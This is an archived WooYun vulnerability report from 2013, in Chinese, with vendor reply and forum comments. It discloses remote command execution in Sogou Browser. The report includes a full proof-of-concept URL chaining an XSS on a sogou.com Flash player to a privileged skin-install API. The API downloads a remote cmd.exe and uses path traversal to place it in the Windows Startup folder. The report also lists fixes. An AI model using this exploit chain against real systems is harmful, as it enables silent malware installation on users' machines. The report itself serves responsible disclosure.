{"id": 7502, "wybug_id": "wooyun-2013-037211", "wybug_title": "搜狗浏览器远程命令执行漏洞", "wybug_corp": "搜狗", "wybug_author": "只抽红梅", "wybug_date": "2013-09-15 14:54", "wybug_open_date": "2013-12-14 14:54", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行", "搜狗浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-14：\t细节向公众公开  简要描述： 对于推动企业安全问题的修复，乌云是一个再合适不过的平台了。看看这次能不能帮助到搜狗。 详细说明：  其实准确一点应该叫《搜狗浏览器下载文件到任意目录导致远程命令执行漏洞》。强烈推荐黑哥的《去年跨过的浏览器》，地址：http://vdisk.weibo.com/s/z1id0otCRMVPt国内为数不多的关于浏览器安全方面的资料，浏览器漏洞出自这里。测试环境：windows 2003 + 搜狗浏览器（4.1.3.9297）1、下载漏洞\nwindow.external.SkinCall(\"install\", \"cmd.exe\", 0, \"http://hongmei.me/cmd.exe\", \"instThmemeCallback\");\n上面代码调用浏览器 api，下载远程的文件到：C:\\Documents and Settings\\Administrator\\Application Data\\SogouExplorer\\skin 目录内。\"cmd.exe\" 这里可以通过 ../ 来跨目录，当我们跨目录把远程文件下载到：C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动 目录内就达到了远程命令执行的效果。2、XSS要调用的 api 有权限控制，*.sogou.com 域有权限调用，我们就找个 XSS 来：http://player.mbox.sogou.com/FlashMP3Player.swf?isFlashReady=function(){if(!window.x){alert(1);window.x=1;}}3、POC到这里就只差 POC 了，构造如下：http://player.mbox.sogou.com/FlashMP3Player.swf?isFlashReady=function(){if(!window.x){window.external.SkinCall(\"install\", \"../../../「开始」菜单/程序/启动/cmd.exe\", 0, \"http://hongmei.me/cmd.exe\", \"instThmemeCallback\");window.x=1;}}4、效果\n\nPS：1、下载到皮肤的目录浏览器默认会加上后缀，但是跨出去就没有了，为什么跨出去的时候不也加上呢？2、启动目录和皮肤目录都在当前用户目录下，所以漏洞不受用户名的限制   漏洞证明：  \n\n   修复方案：  1、修复本文中的 XSS，以及所有 *.sogou.com 域下的 XSS2、严格控制 api 的权限3、限制下载文件的域名以及禁止跨目录   版权声明：转载请注明来源 只抽红梅@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-09-16 12:35 厂商回复： 收到，感谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-15 15:03 |    \t\t78基佬 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:20        | 不会日站的设计师不是好产品经理)\t\t \n  手机app还是电脑的浏览器？？？    \n     2013-09-15 15:04 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  尼玛又开始了。。。。poc真多    \n     2013-09-16 10:14 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  你是来刷钱的吧    \n     2013-09-16 10:55 |    \t\t只抽红梅 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:13        | 红梅花儿开，我从帝都来！)\t\t \n  @xsser 难道我们不是怀着为了让安全变得更美好而来的么？    \n     2013-09-16 12:26 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @只抽红梅 嗯 是的    \n     2013-09-16 14:13 |    \t\t只抽红梅 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:13        | 红梅花儿开，我从帝都来！)\t\t \n  @搜狗 好不厚道啊    \n     2013-09-19 15:47 |    \t\triskuusk \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | world have risk)\t\t \n  老问题吧，这个搜狗PC浏览器的命令执行，之前都有人搞过了，跟我一样刷分的。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}